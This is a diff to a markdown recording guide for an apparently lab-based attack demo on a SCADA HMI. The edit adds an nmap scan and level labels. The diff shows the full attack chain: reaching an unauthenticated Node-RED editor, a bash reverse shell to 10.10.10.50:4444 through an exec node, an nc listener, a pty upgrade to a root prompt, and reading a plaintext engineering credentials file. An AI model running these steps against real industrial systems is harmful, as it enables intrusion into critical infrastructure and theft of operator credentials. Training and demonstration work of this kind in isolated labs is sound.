@@ -41,19 +41,24 @@ This checklist and step-by-step recording guide ensures you capture all the nece
 
 ---
 
-### Section 2: SCADA Node Entry via Node-RED (Duration: ~1m)
-1. **Exposure:** Show the browser connecting to the unauthenticated Node-RED interface:
+### Section 2: SCADA Subnet Scan & HMI Discovery (Duration: ~1m)
+1. **Network Discovery (Level 2):** From your Kali attacker host, scan the operations subnet to identify the active HMI host:
+   ```bash
+   nmap -p 1880 --open 192.168.100.0/24
+   ```
+   Show that port `1880` is open on IP `192.168.100.10`.
+2. **Access Editor:** Open the browser and navigate to the unauthenticated Node-RED interface:
    `http://192.168.100.10:1880/`
-2. **Flow Verification:** Show the simple flow: an `inject` node wired to an `exec` node.
-3. **Payload Inspection:** Double-click the `exec` node to show the shell command:
+3. **Flow Verification:** Show the simple flow: an `inject` node wired to an `exec` node.
+4. **Payload Inspection:** Double-click the `exec` node to show the shell command:
    ```bash
    bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'
    ```
-4. **Listener Setup:** Switch to the Kali terminal and show you starting the listener:
+5. **Listener Setup:** Switch to the Kali terminal and show you starting the listener:
    ```bash
    nc -nlvp 4444
    ```
-5. **Execution:** Switch back to the browser, click **Deploy**, and then click the square button on the `inject` node to trigger the reverse shell.
+6. **Execution (Level 3):** Switch back to the browser, click **Deploy**, and then click the square button on the `inject` node to trigger the reverse shell.
 
 ---
 
@@ -65,11 +70,11 @@ This checklist and step-by-step recording guide ensures you capture all the nece
    python3 -c 'import pty; pty.spawn("/bin/bash")'
    ```
    Show your prompt changing to `root@scada-hmi:~#`.
-4. **Credential Extraction:** Read the leaked engineering credentials stored on the HMI filesystem:
+4. **Credential Extraction (Level 4):** Read the leaked engineering credentials stored on the HMI filesystem:
    ```bash
    cat /home/debian/ews_credentials.txt
    ```
-   Show the output: `operator : operator123`.
+   Show the output: `operator : operator123`. Copy the password `operator123`.
 
 ---
 
